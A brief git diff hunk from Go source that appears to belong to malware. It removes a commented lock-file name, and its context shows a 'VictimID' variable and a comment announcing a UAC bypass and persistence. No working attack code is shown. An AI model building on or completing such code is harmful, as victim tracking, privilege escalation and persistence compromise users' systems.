@@ -13,7 +13,6 @@ import (
 	"github.com/jeandeaual/go-locale"
 )
 
-// var LockFileName = "g0_l4nG_1S_FuN_i5nT_1T.lock"
 var VictimID string
 
 // UAC Bypass + persistence.
